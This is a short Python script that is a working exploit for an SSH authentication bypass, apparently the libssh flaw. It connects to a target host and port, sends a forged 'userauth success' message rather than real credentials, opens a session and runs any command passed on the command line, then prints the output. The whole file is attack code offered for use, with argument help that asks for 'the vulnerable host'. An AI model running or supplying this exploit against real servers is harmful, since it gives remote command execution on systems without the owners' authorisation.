from socket import *
import sys
import time
import datetime
import paramiko
import argparse

sock = socket()

parser = argparse.ArgumentParser(description='Get host and port')
parser.add_argument('host_ip', type=str, help='Enter the ip address of the vulnerable host')
parser.add_argument('host_port', type=int, help='Enter the port the vulnerable service is running on')
parser.add_argument('cmd', type=str, help='Enter command to be excecuted')
args = parser.parse_args()

host_ip = args.host_ip
host_port = args.host_port
cmd = args.cmd

try:
    sock.connect((host_ip, host_port))
    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()

    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)

    session = transport.open_session()
    session.exec_command(cmd)
    data = ''
    maxseconds = 5
    start = datetime.datetime.now()
    start_secs = time.mktime(start.timetuple())
    while True:
        if session.recv_ready():
            data = data+str(session.recv(2048))
        if session.exit_status_ready():
            break
        now = datetime.datetime.now()
        now_secs = time.mktime(now.timetuple())
        et_secs = now_secs - start_secs
        if et_secs > maxseconds:
            data = data+'\ntimeout'
            break
    print (data)

except paramiko.SSHException as e:
    print("TCPForwarding disabled on remote/local server can't connect. Not Vulnerable")
except error:
    print("Unable to connect.")
